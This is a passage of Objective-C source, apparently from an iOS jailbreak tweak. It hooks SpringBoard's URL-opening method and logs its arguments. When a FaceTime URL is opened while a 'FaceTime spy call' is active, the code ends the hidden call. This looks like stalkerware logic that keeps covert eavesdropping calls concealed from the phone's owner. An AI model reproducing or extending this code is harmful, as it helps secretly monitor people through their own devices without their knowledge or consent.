		CALL_ORIG(SpringBoard, _applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$, arg1, arg2, arg3, arg4, arg5, arg6);
	}
}

// iOS 7
HOOK(SpringBoard, _applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$activationHandler$, void, id arg1, id arg2, id arg3, _Bool arg4, _Bool arg5, id arg6, id arg7) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	APPLOGVERBOSE(@"[arg3 class] = %@, arg3 = %@", [arg3 class], arg3);
	APPLOGVERBOSE(@"arg4 = %d", arg4);
	APPLOGVERBOSE(@"arg5 = %d", arg5);
	APPLOGVERBOSE(@"[arg6 class] = %@, arg6 = %@", [arg6 class], arg6);
    APPLOGVERBOSE(@"[arg7 class] = %@, arg7 = %@", [arg7 class], arg7);
	
	NSURL *url = arg1;
	NSString *scheme = [url scheme];
	APPLOGVERBOSE (@"Url scheme = %@", scheme);
	if ([scheme isEqualToString:@"facetime"]) {
		if (isFaceTimeSpyCallInProgress()) {
			endFaceTimeSpyCall();
		} else {
			CALL_ORIG(SpringBoard, _applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$activationHandler$, arg1, arg2, arg3, arg4, arg5, arg6, arg7);
		}
	} else {
		CALL_ORIG(SpringBoard, _applicationOpenURL$withApplication$sender$publicURLsOnly$animating$additionalActivationFlags$activationHandler$, arg1, arg2, arg3, arg4, arg5, arg6, arg7);
	}
}
